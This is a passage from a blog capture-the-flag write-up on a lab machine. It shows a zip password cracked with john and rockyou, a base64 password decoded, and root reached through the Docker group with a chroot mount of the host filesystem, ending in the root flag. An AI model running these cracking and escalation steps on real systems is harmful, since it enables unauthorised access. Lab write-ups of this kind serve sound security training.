+<div class="mb-3 syntax-highlight"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(root💀kali)-[~]
+</span></span><span class="line"><span class="cl">└─# zip2john backup.zip &gt; hash.txt
+</span></span><span class="line"><span class="cl">Created directory: /root/.john
+</span></span><span class="line"><span class="cl">ver 2.0 efh 5455 efh 7875 backup.zip/source_code.php PKZIP Encr: 2b chk, TS_chk, cmplen=554, decmplen=1211, crc=69DC82F3</span></span></code></pre></div></div><div class="mb-3 syntax-highlight"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(root💀kali)-[~]
+</span></span><span class="line"><span class="cl">└─# cat hash.txt 
+</span></span><span class="line"><span class="cl">backup.zip/source_code.php:$pkzip2$1*2*2*0*22a*4bb*69dc82f3*0*49*8*22a*69dc*2297*8e9e8de3a4b82cc98077a470ef800ed60ec6e205dc091547387432378de4c26ae8d64051a19d86bff2247f62dc1224ee79f048927d372bc6a45c0f21753a7b6beecfa0c847126d88084e57ddb9c90e9b0ef8018845c7d82b97b438a0a76e9a39c4846a146ae06efe4027f733ab63b509a56e2dec4c1dbce84337f0816421790246c983540c6fab21dd43aeda16d91addc5845dd18a05352ca9f4fcb45f0135be428c84dbac5a8d0c1fb2e84a7151ec3c1ae9740a84f2979d79da2e20d4854ef4483356cd078099725b5e7cf475144b22c64464a85edb8984cf7fc41d6a177f172c65e57f064700b6d49ef8298d83f42145e69befeab92453bd5f89bf827cd7993c9497eb2ad9868abd34b7a7b85f8e67404e2085de966e1460ad0ea031f895c7da70edbe7b7d6641dcdf6a4a31abc8781292a57b047a1cc5ce5ab4f375acf9a2ff4cac0075aa49e92f2d22e779bf3d9eacd2e1beffef894bc67de7235db962c80bbd3e3b54a14512a47841140e162184ca5d5d0ba013c1eaaa3220d82a53959a3e7d94fb5fa3ef3dfc049bdbd186851a1e7a8f344772155e569a5fa12659f482f4591198178600bb1290324b669d645dbb40dad2e52bf2adc2a55483837a5fc847f5ff0298fd47b139ce2d87915d688f09d8d167470db22bda770ce1602d6d2681b3973c5aac3b03258900d9e2cc50b8cea614d81bcfbb05d510638816743d125a0dce3459c29c996a5fdc66476f1b4280ac3f4f28ed1dbff48ef9f24fc028acc1393d07233d0181a6e3*$/pkzip2$:source_code.php:backup.zip::backup.zip</span></span></code></pre></div></div><p>Then try to crack it with rockyou.txt wordlist.</p>
+<div class="mb-3 syntax-highlight"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(root💀kali)-[~]
+</span></span><span class="line"><span class="cl">└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
+</span></span><span class="line"><span class="cl">Using default input encoding: UTF-8
+</span></span><span class="line"><span class="cl">Loaded 1 password hash (PKZIP [32/64])
+</span></span><span class="line"><span class="cl">Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+</span></span><span class="line"><span class="cl">pass1word        (backup.zip/source_code.php)
+</span></span><span class="line"><span class="cl">1g 0:00:00:00 DONE (2020-12-18 22:44) 10.00g/s 119680p/s 119680c/s 119680C/s fallen1..napster
+</span></span><span class="line"><span class="cl">Use the &#34;--show&#34; option to display all of the cracked passwords reliably
+</span></span><span class="line"><span class="cl">Session completed</span></span></code></pre></div></div><p>File unziped.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<figure >
+
+<div class=""><img class="img-fluid "
+            src="https://res.cloudinary.com/dtr6hzxnx/image/upload/c_fit,h_492,w_2800/v1608376756/blog/image-20201218225009311_o7bsup.jpg"
+            
+            
+            srcset="https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_101,w_576/v1608376756/blog/image-20201218225009311_o7bsup.png 576w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_135,w_768/v1608376756/blog/image-20201218225009311_o7bsup.png 768w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_174,w_992/v1608376756/blog/image-20201218225009311_o7bsup.png 992w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_211,w_1200/v1608376756/blog/image-20201218225009311_o7bsup.png 1200w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_246,w_1400/v1608376756/blog/image-20201218225009311_o7bsup.png 1400w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_492,w_2800/v1608376756/blog/image-20201218225009311_o7bsup.png 2800w" sizes="100vw"
+            height="492"
+            width="2800"
+            alt=" ">
+</div><figcaption class="figure-caption"> </figcaption>
+    </figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<figure >
+
+<div class=""><img class="img-fluid "
+            src="https://res.cloudinary.com/dtr6hzxnx/image/upload/c_fit,h_1998,w_2800/v1608376757/blog/image-20201218224946498_rped7r.jpg"
+            
+            
+            srcset="https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_411,w_576/v1608376757/blog/image-20201218224946498_rped7r.png 576w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_548,w_768/v1608376757/blog/image-20201218224946498_rped7r.png 768w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_708,w_992/v1608376757/blog/image-20201218224946498_rped7r.png 992w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_856,w_1200/v1608376757/blog/image-20201218224946498_rped7r.png 1200w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_999,w_1400/v1608376757/blog/image-20201218224946498_rped7r.png 1400w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_1998,w_2800/v1608376757/blog/image-20201218224946498_rped7r.png 2800w" sizes="100vw"
+            height="1998"
+            width="2800"
+            alt=" ">
+</div><figcaption class="figure-caption"> </figcaption>
+    </figure>
+
+<h1 id="-privilege-escalation" class="heading">🛡️ Privilege Escalation <a href="#-privilege-escalation" aria-labelledby="-privilege-escalation">
+
+
+
+
+
+
+
+
+
+    
+
+    <!-- <i class="fas fa-link anchor"></i> --><svg class="svg-inline--fa fas fa-link anchor" fill="currentColor" aria-hidden="true" role="img" viewBox="0 0 640 512"><path d="M579.8 267.7c56.5-56.5 56.5-148 0-204.5c-50-50-128.8-56.5-186.3-15.4l-1.6 1.1c-14.4 10.3-17.7 30.3-7.4 44.6s30.3 17.7 44.6 7.4l1.6-1.1c32.1-22.9 76-19.3 103.8 8.6c31.5 31.5 31.5 82.5 0 114L422.3 334.8c-31.5 31.5-82.5 31.5-114 0c-27.9-27.9-31.5-71.8-8.6-103.8l1.1-1.6c10.3-14.4 6.9-34.4-7.4-44.6s-34.4-6.9-44.6 7.4l-1.1 1.6C206.5 251.2 213 330 263 380c56.5 56.5 148 56.5 204.5 0L579.8 267.7zM60.2 244.3c-56.5 56.5-56.5 148 0 204.5c50 50 128.8 56.5 186.3 15.4l1.6-1.1c14.4-10.3 17.7-30.3 7.4-44.6s-30.3-17.7-44.6-7.4l-1.6 1.1c-32.1 22.9-76 19.3-103.8-8.6C74 372 74 321 105.5 289.5L217.7 177.2c31.5-31.5 82.5-31.5 114 0c27.9 27.9 31.5 71.8 8.6 103.9l-1.1 1.6c-10.3 14.4-6.9 34.4 7.4 44.6s34.4 6.9 44.6-7.4l1.1-1.6C433.5 260.8 427 182 377 132c-56.5-56.5-148-56.5-204.5 0L60.2 244.3z"/></svg>
+
+    &nbsp;
+</a></h1>
+<p>Now we have anurodh user password.</p>
+<div class="mb-3 syntax-highlight"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(root💀kali)-[~]
+</span></span><span class="line"><span class="cl">└─# echo &#34;IWQwbnRLbjB3bVlwQHNzdzByZA==&#34; | base64 -d
+</span></span><span class="line"><span class="cl">!d0ntKn0wmYp@ssw0rd</span></span></code></pre></div></div><p>We logged as Anurodh, and figure and immediately figured out the <code>anurodh</code> is member of Docker group, which service runs as <code>root</code>.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<figure >
+
+<div class=""><img class="img-fluid "
+            src="https://res.cloudinary.com/dtr6hzxnx/image/upload/c_fit,h_513,w_2800/v1608376757/blog/image-20201218225714302_alk24n.jpg"
+            
+            
+            srcset="https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_106,w_576/v1608376757/blog/image-20201218225714302_alk24n.png 576w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_141,w_768/v1608376757/blog/image-20201218225714302_alk24n.png 768w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_182,w_992/v1608376757/blog/image-20201218225714302_alk24n.png 992w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_220,w_1200/v1608376757/blog/image-20201218225714302_alk24n.png 1200w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_256,w_1400/v1608376757/blog/image-20201218225714302_alk24n.png 1400w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_513,w_2800/v1608376757/blog/image-20201218225714302_alk24n.png 2800w" sizes="100vw"
+            height="513"
+            width="2800"
+            alt=" ">
+</div><figcaption class="figure-caption"> </figcaption>
+    </figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<figure >
+
+<div class=""><img class="img-fluid "
+            src="https://res.cloudinary.com/dtr6hzxnx/image/upload/c_fit,h_221,w_2800/v1608376757/blog/image-20201218225950923_lfckaa.jpg"
+            
+            
+            srcset="https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_45,w_576/v1608376757/blog/image-20201218225950923_lfckaa.png 576w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_61,w_768/v1608376757/blog/image-20201218225950923_lfckaa.png 768w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_78,w_992/v1608376757/blog/image-20201218225950923_lfckaa.png 992w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_95,w_1200/v1608376757/blog/image-20201218225950923_lfckaa.png 1200w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_110,w_1400/v1608376757/blog/image-20201218225950923_lfckaa.png 1400w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_221,w_2800/v1608376757/blog/image-20201218225950923_lfckaa.png 2800w" sizes="100vw"
+            height="221"
+            width="2800"
+            alt=" ">
+</div><figcaption class="figure-caption"> </figcaption>
+    </figure>
+<p>This part was particularly new for me, reading searching on Google and after <a href="https://medium.com/@Affix/privilege-escallation-with-docker-56dc682a6e17">reading this article</a>, I reached my last goal, escalate privilege with Docker.</p>
+<div class="mb-3 syntax-highlight"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ docker run -it -v /:/mnt alpine chroot /mnt</span></span></code></pre></div></div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<figure >
+
+<div class=""><img class="img-fluid "
+            src="https://res.cloudinary.com/dtr6hzxnx/image/upload/c_fit,h_1486,w_2800/v1608376757/blog/image-20201218231708876_nnwuac.jpg"
+            
+            
+            srcset="https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_306,w_576/v1608376757/blog/image-20201218231708876_nnwuac.png 576w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_408,w_768/v1608376757/blog/image-20201218231708876_nnwuac.png 768w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_526,w_992/v1608376757/blog/image-20201218231708876_nnwuac.png 992w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_637,w_1200/v1608376757/blog/image-20201218231708876_nnwuac.png 1200w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_743,w_1400/v1608376757/blog/image-20201218231708876_nnwuac.png 1400w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_1486,w_2800/v1608376757/blog/image-20201218231708876_nnwuac.png 2800w" sizes="100vw"
+            height="1486"
+            width="2800"
+            alt=" ">
+</div><figcaption class="figure-caption"> </figcaption>
+    </figure>
+
+<h1 id="-complete" class="heading">🍻 Complete <a href="#-complete" aria-labelledby="-complete">
+
+
+
+
+
+
+
+
+
+    
+
+    <!-- <i class="fas fa-link anchor"></i> --><svg class="svg-inline--fa fas fa-link anchor" fill="currentColor" aria-hidden="true" role="img" viewBox="0 0 640 512"><path d="M579.8 267.7c56.5-56.5 56.5-148 0-204.5c-50-50-128.8-56.5-186.3-15.4l-1.6 1.1c-14.4 10.3-17.7 30.3-7.4 44.6s30.3 17.7 44.6 7.4l1.6-1.1c32.1-22.9 76-19.3 103.8 8.6c31.5 31.5 31.5 82.5 0 114L422.3 334.8c-31.5 31.5-82.5 31.5-114 0c-27.9-27.9-31.5-71.8-8.6-103.8l1.1-1.6c10.3-14.4 6.9-34.4-7.4-44.6s-34.4-6.9-44.6 7.4l-1.1 1.6C206.5 251.2 213 330 263 380c56.5 56.5 148 56.5 204.5 0L579.8 267.7zM60.2 244.3c-56.5 56.5-56.5 148 0 204.5c50 50 128.8 56.5 186.3 15.4l1.6-1.1c14.4-10.3 17.7-30.3 7.4-44.6s-30.3-17.7-44.6-7.4l-1.6 1.1c-32.1 22.9-76 19.3-103.8-8.6C74 372 74 321 105.5 289.5L217.7 177.2c31.5-31.5 82.5-31.5 114 0c27.9 27.9 31.5 71.8 8.6 103.9l-1.1 1.6c-10.3 14.4-6.9 34.4 7.4 44.6s34.4 6.9 44.6-7.4l1.1-1.6C433.5 260.8 427 182 377 132c-56.5-56.5-148-56.5-204.5 0L60.2 244.3z"/></svg>
+
+    &nbsp;
+</a></h1>
+<div class="mb-3 syntax-highlight"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@62ad51d2a37c:~# cat proof.txt
+</span></span><span class="line"><span class="cl">cat proof.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">					<span class="o">{</span>ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg<span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Congratulations! You have successfully completed the challenge.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">         ,-.-.     ,----.                                             _,.---._    .-._           ,----.  
+</span></span><span class="line"><span class="cl">,-..-.-./  <span class="se">\=</span><span class="o">=</span><span class="se">\ </span>,-.--<span class="sb">`</span> , <span class="se">\ </span>  _.-.      _.-.             _,..---._   ,-.<span class="s1">&#39; , -  `. /==/ \  .-._ ,-.--` , \ 
+</span></span></span><span class="line"><span class="cl"><span class="s1">| , \=/\= | - | == |  | == | -  _.-` .-,.&#39;</span> <span class="p">|</span> .-,.<span class="s1">&#39; | /==/,   -  \ /==/_,  ,  - \|== | , \/ /, /== | -  _.-` |
+</span></span></span><span class="line"><span class="cl"><span class="s1">| ------- |/ |/ , /==/|==|   `.-.|==|, |   |==|, |           |==|   _   _\==|   .=.     |==|-  \|  ||==|   `.-. 
+</span></span></span><span class="line"><span class="cl"><span class="s1"> \, ,     _|==/==/_ ,    /|==|- |   |==|- |           |==|  .=.   |==|_ : ;=:  - |==| ,  | -/==/_ ,    / 
+</span></span></span><span class="line"><span class="cl"><span class="s1"> | -  -  , |==|==|    .-&#39;</span> <span class="p">|</span><span class="o">==</span><span class="p">|</span>, <span class="p">|</span>   <span class="p">|</span><span class="o">==</span><span class="p">|</span>, <span class="p">|</span>           <span class="p">|</span><span class="o">==</span><span class="p">|</span>,<span class="p">|</span>   <span class="p">|</span> -<span class="p">|</span><span class="o">==</span><span class="p">|</span> , <span class="s1">&#39;=&#39;</span>     <span class="p">|</span><span class="o">==</span><span class="p">|</span> -   _ <span class="p">|</span><span class="o">==</span><span class="p">|</span>    .-<span class="s1">&#39;  
+</span></span></span><span class="line"><span class="cl"><span class="s1">  \  ,  - /==/|==|_  ,`-._|==|- `-._|==|- `-._        |==|  &#39;</span><span class="o">=</span><span class="s1">&#39;   /\==\ -    ,_ /|==|  /\ , |==|_  ,`-._ 
+</span></span></span><span class="line"><span class="cl"><span class="s1">  |-  /\ /==/ /==/ ,     //==/ - , ,/==/ - , ,/       |==|-,   _`/  &#39;</span>.<span class="o">=</span><span class="s1">&#39;. -   .&#39;</span> /<span class="o">==</span>/, <span class="p">|</span> <span class="p">|</span>- /<span class="o">==</span>/ ,     / 
+</span></span><span class="line"><span class="cl">  <span class="sb">`</span>--<span class="sb">`</span>  <span class="sb">`</span>--<span class="sb">`</span>  <span class="sb">`</span>--<span class="sb">`</span>-----<span class="sb">``</span> <span class="sb">`</span>--<span class="sb">`</span>-----<span class="s1">&#39;`--`-----&#39;</span>        <span class="sb">`</span>-.<span class="sb">`</span>.____.<span class="s1">&#39;     `--`--&#39;</span><span class="err">&#39;</span>   <span class="sb">`</span>--<span class="sb">`</span>./  <span class="sb">`</span>--<span class="sb">`</span>--<span class="sb">`</span>-----<span class="sb">``</span>  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">--------------------------------------------Designed By -------------------------------------------------------
+</span></span><span class="line"><span class="cl">					<span class="p">|</span>  Anurodh Acharya <span class="p">|</span>
+</span></span><span class="line"><span class="cl">					---------------------
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	               		     Let me know <span class="k">if</span> you liked it.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Twitter
+</span></span><span class="line"><span class="cl">	- @acharya_anurodh
+</span></span><span class="line"><span class="cl">Linkedin
+</span></span><span class="line"><span class="cl">	- www.linkedin.com/in/anurodh-acharya-b1937116a
+</span></span><span class="line"><span class="cl"><span class="o">}</span></span></span></code></pre></div></div>
+
+
+<div class="row row-cols-2 mt-5 mb-3">
+    <div class="col">
+        <a class="next" href="/blog/gestao-de-vulnerabilidades-com-greenbone-openvas/">
+
+
+
+
+
+
+
+
+
+    
+
+    <!-- <i class="fas fa-arrow-left "></i> --><svg class="svg-inline--fa fas fa-arrow-left " fill="currentColor" aria-hidden="true" role="img" viewBox="0 0 448 512"><path d="M9.4 233.4c-12.5 12.5-12.5 32.8 0 45.3l160 160c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L109.2 288 416 288c17.7 0 32-14.3 32-32s-14.3-32-32-32l-306.7 0L214.6 118.6c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0l-160 160z"/></svg>
+
+    
+&nbsp;Gestão de vulnerabilidades com Greenbone Openvas - Ubuntu 20.04
+                </a></div>
+    <div class="col text-end">
+        <a class="previous" href="/blog/devguru1_vulnhub/">
+                    DevGuru: 1 - Vulnhub &nbsp;
+
+
+
+
+
+
+
+
+
+    
+
+    <!-- <i class="fas fa-arrow-right "></i> --><svg class="svg-inline--fa fas fa-arrow-right " fill="currentColor" aria-hidden="true" role="img" viewBox="0 0 448 512"><path d="M438.6 278.6c12.5-12.5 12.5-32.8 0-45.3l-160-160c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3L338.8 224 32 224c-17.7 0-32 14.3-32 32s14.3 32 32 32l306.7 0L233.4 393.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l160-160z"/></svg>
+
+    
+
+                </a></div>
+</div>
+
+
+                </div>
+                <div class="col col-md-3 col-lg-2 d-none d-md-block pt-5">
+                    
+    
+
+
+<div class="toc toc-sidebar mb-5 my-md-0 mb-lg-5 p-3 text-body-secondary sticky-top">
+    
+
+    
+        
+        
+
+
+
+
+
+
+
+<strong class="d-block h6 my-2 pb-2">On this page:</strong>
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#port-scan">Port scan</a></li>
+    <li><a href="#reading-public-available-ftp">Reading public available FTP</a></li>
+    <li><a href="#web-discovery">Web discovery</a>
+      <ul>
+        <li><a href="#nikto">Nikto</a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li><a href="#becoming-apaar">Becoming &ldquo;apaar&rdquo;</a></li>
+    <li><a href="#reverse-ssh-tunnel">Reverse SSH Tunnel</a></li>
+    <li><a href="#web-discovery-1">Web discovery</a>
+      <ul>
+        <li><a href="#nikto-1">Nikto</a></li>
+        <li><a href="#ffuf">ffuf</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+    </div>
+
+                </div>
+            </div>
+        </div>
+
+
+
+<div class="container-fluid bg-primary bg-opacity-10">
+        <div class="container-xxl px-4 px-xxl-0">
+            <div class="row row-cols-2 py-3 align-items-center">
+                <div class="col col-6">
+                    <div class="row justify-content-end p-0">
+                        <div class="col-12 col-md-8 p-0">
+                            <div class="fs-3 fw-bold">👾</div>
+                            <p>Eternal student.</p>
+                        </div>
+                    </div>
+                </div>
+                <div class="col col-6 text-sm-start">
+                    <a href="https://linkedin.com/in/tiagotavi"  aria-label="LinkedIn" class="text-decoration-none link-secondary d-inline p-2">
+                            
+                                
+
+
+
+
+
+
+
+
+
+    
+
+    <!-- <i class="fab fa-linkedin fa-2x"></i> --><svg class="svg-inline--fa fab fa-linkedin fa-2x" fill="currentColor" aria-hidden="true" role="img" viewBox="0 0 448 512"><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
+
+    &nbsp;
+
+                            
+                        </a>
+                    <a href="https://github.com/0xtiago"  aria-label="GitHub" class="text-decoration-none link-secondary d-inline p-2">
+                            
+                                
+
+
+
+
+
+
+
+
+
+    
+
+    <!-- <i class="fab fa-github fa-2x"></i> --><svg class="svg-inline--fa fab fa-github fa-2x" fill="currentColor" aria-hidden="true" role="img" viewBox="0 0 496 512"><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+
+    &nbsp;
+
+                            
+                        </a>
+                    <a href="https://x.com/tiagotavi"  aria-label="X" class="text-decoration-none link-secondary d-inline p-2">
+                            
+                                
+
+
+
+
+
+
+
+
+
+    
+
+    <!-- <i class="fab fa-x-twitter fa-2x"></i> --><svg class="svg-inline--fa fab fa-x-twitter fa-2x" fill="currentColor" aria-hidden="true" role="img" viewBox="0 0 512 512"><path d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg>
+
+    &nbsp;
+
+                            
+                        </a>
+                    </div>
+            </div>
+        </div>
+    </div>
+<footer class="container-fluid footer text-center p-3">
+    <div class="container-xxl text-center">
+        <small>
+            Copyright © 2024 Tiago Tavares.
+            
+            
+        </small>
+    </div>
+</footer>
+        </div>
+
+        <div id="toast-container" class="toast-container position-fixed bottom-0 end-0 p-3">
+
+
+
+
+
+
+
+<div id="toast-copied-code-message" class="toast" role="alert" aria-live="assertive" aria-atomic="true">
+    <div class="toast-header">
+        <strong class="me-auto">debugging the life</strong>
+        <button type="button" class="btn-close" data-bs-dismiss="toast" aria-label="Close"></button>
+    </div>
+    <div class="toast-body">Code copied to clipboard</div>
+</div>
+</div>
+
+<script src="/js/main.bundle.min.c6089b984ef35ae8e9bccfc100c85f00bea06b9a6527ae4d5a59e9170e15a11f.js" integrity="sha256-xgibmE7zWujpvM/BAMhfAL6ga5plJ65NWlnpFw4VoR8=" crossorigin="anonymous" async></script>
+    
+
+    
+
+
+
+
+</body>
+</html>
